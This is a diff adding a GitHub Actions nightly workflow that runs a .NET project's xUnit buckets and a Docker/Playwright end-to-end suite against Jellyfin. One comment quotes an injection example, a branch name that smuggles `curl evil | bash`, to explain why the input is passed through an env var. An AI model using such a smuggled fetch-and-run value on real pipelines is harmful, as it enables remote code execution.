@@ -1,0 +1,189 @@
+name: Nightly Full Test Suite
+
+# Runs the ENTIRE test surface — every xUnit bucket (Unit, Security,
+# Performance) plus the Docker end-to-end suite — once a day, and on demand.
+#
+# Why this exists: the per-PR workflows (pr.yml, e2e.yml) are tuned for speed —
+# Performance tests are allowed to soft-fail on PRs, and nothing runs on a
+# schedule. This workflow is the "belt and suspenders" full run: nothing is
+# skipped, nothing soft-fails, so a regression that only shows up in the
+# performance bucket or the full e2e stack is caught within 24h even if no PR
+# touched the area.
+#
+# Manual runs (workflow_dispatch) take a `branch` input so you can point the
+# full suite at ANY branch — not just the default one the schedule uses.
+
+on:
+  schedule:
+    # 00:17 UTC daily ("midnight", nudged a few minutes off :00 so we don't pile
+    # onto the top-of-hour scheduler rush). GitHub cron is always UTC.
+    - cron: '17 0 * * *'
+  workflow_dispatch:
+    inputs:
+      branch:
+        description: 'Branch to run the full test suite against'
+        required: true
+        default: 'main'
+        type: string
+
+permissions: {}
+
+concurrency:
+  # One nightly run per target ref at a time; a newer trigger supersedes an
+  # in-flight one for the same branch.
+  group: nightly-${{ inputs.branch || github.ref }}
+  cancel-in-progress: true
+
+jobs:
+  # --- unit / security / performance (xUnit) --------------------------------
+  dotnet-tests:
+    name: "xUnit (${{ matrix.bucket.name }})"
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    timeout-minutes: 30
+
+    strategy:
+      # Run every bucket even if one fails — we want the full nightly picture,
+      # not an early bail-out.
+      fail-fast: false
+      matrix:
+        bucket:
+          - name: Unit
+            filter: "Category!=Performance&Category!=Security"
+          - name: Security
+            filter: "Category=Security"
+          - name: Performance
+            filter: "Category=Performance"
+          # NOTE: unlike pr.yml, Performance is NOT continue-on-error here — a
+          # nightly perf regression should turn the run red.
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+        with:
+          # This job never pushes back to the repo — don't persist the token.
+          persist-credentials: false
+          # On manual runs, test the branch the user picked; on the schedule,
+          # this input is empty and checkout falls back to the ref the workflow
+          # was triggered on (the default branch).
+          ref: ${{ inputs.branch || github.ref }}
+
+      - name: Setup .NET
+        uses: actions/setup-dotnet@a98b56852c35b8e3190ac28c8c2271da59106c68 # v6
+        with:
+          dotnet-version: 10.0.x
+
+      - name: Restore
+        run: dotnet restore
+
+      - name: Build
+        run: dotnet build --configuration Release --no-restore
+
+      - name: "Run ${{ matrix.bucket.name }} tests"
+        env:
+          TEST_FILTER: ${{ matrix.bucket.filter }}
+        run: |
+          dotnet test --configuration Release --no-build --verbosity normal \
+            --filter "$TEST_FILTER" \
+            --logger "trx;LogFileName=${{ matrix.bucket.name }}.trx"
+
+      - name: Upload test results
+        if: always()
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7
+        with:
+          name: nightly-test-results-${{ matrix.bucket.name }}
+          path: "**/TestResults/*.trx"
+          retention-days: 14
+
+  # --- end-to-end (Docker + real Jellyfin 12 + mock Arr/Seerr) --------------
+  e2e:
+    name: E2E (Docker)
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    timeout-minutes: 40
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+        with:
+          # This job never pushes back to the repo — don't persist the token.
+          persist-credentials: false
+          ref: ${{ inputs.branch || github.ref }}
+
+      - name: Setup .NET
+        uses: actions/setup-dotnet@a98b56852c35b8e3190ac28c8c2271da59106c68 # v6
+        with:
+          dotnet-version: 10.0.x
+
+      - name: Setup Node
+        uses: actions/setup-node@a0853c24544627f65ddf259abe73b1d18a591444 # v5
+        with:
+          node-version: 22
+
+      - name: Show Docker versions
+        run: docker --version && docker compose version
+
+      - name: Run E2E suite
+        run: bash test/e2e/scripts/run.sh
+        env:
+          CI: "true"
+          # Require the non-admin fixture in CI so authorization / user-facing
+          # tests fail loudly instead of silently skipping if provisioning breaks.
+          E2E_REQUIRE_NORMAL_USER: "1"
+
+      - name: Upload Playwright report
+        if: always()
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7
+        with:
+          name: nightly-e2e-playwright-report
+          path: test/e2e/playwright-report/
+          retention-days: 14
+
+      - name: Upload traces & screenshots
+        if: failure()
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7
+        with:
+          name: nightly-e2e-traces
+          path: test/e2e/test-results/
+          retention-days: 14
+
+      - name: Dump Jellyfin server log on failure
+        if: failure()
+        run: |
+          echo "::group::Jellyfin container log"
+          docker logs jfh-e2e-jellyfin 2>&1 | tail -300 || true
+          echo "::endgroup::"
+          echo "::group::mock-arr log"
+          docker logs jfh-e2e-mock-arr 2>&1 | tail -100 || true
+          echo "::endgroup::"
+          echo "::group::mock-seerr log"
+          docker logs jfh-e2e-mock-seerr 2>&1 | tail -100 || true
+          echo "::endgroup::"
+
+  # --- roll-up gate: one red check if anything above failed -----------------
+  nightly-summary:
+    name: Nightly result
+    runs-on: ubuntu-latest
+    needs: [dotnet-tests, e2e]
+    if: always()
+    steps:
+      - name: Report combined result
+        env:
+          # Route the free-form workflow_dispatch input through an env var so it is
+          # treated as data, never re-evaluated by the shell (avoids injection via a
+          # crafted branch name like `x"; curl evil | bash; echo "`).
+          TARGET_REF: ${{ inputs.branch || github.ref }}
+        run: |
+          echo "## Nightly full test suite" >> "$GITHUB_STEP_SUMMARY"
+          echo "" >> "$GITHUB_STEP_SUMMARY"
+          echo "- Target ref: \`$TARGET_REF\`" >> "$GITHUB_STEP_SUMMARY"
+          echo "- xUnit (Unit/Security/Performance): ${{ needs.dotnet-tests.result }}" >> "$GITHUB_STEP_SUMMARY"
+          echo "- E2E (Docker): ${{ needs.e2e.result }}" >> "$GITHUB_STEP_SUMMARY"
+          if [ "${{ needs.dotnet-tests.result }}" != "success" ] || [ "${{ needs.e2e.result }}" != "success" ]; then
+            echo "::error::Nightly full test suite failed (xUnit=${{ needs.dotnet-tests.result }}, e2e=${{ needs.e2e.result }})"
+            exit 1
+          fi
+          echo "" >> "$GITHUB_STEP_SUMMARY"
+          echo "All suites green." >> "$GITHUB_STEP_SUMMARY"
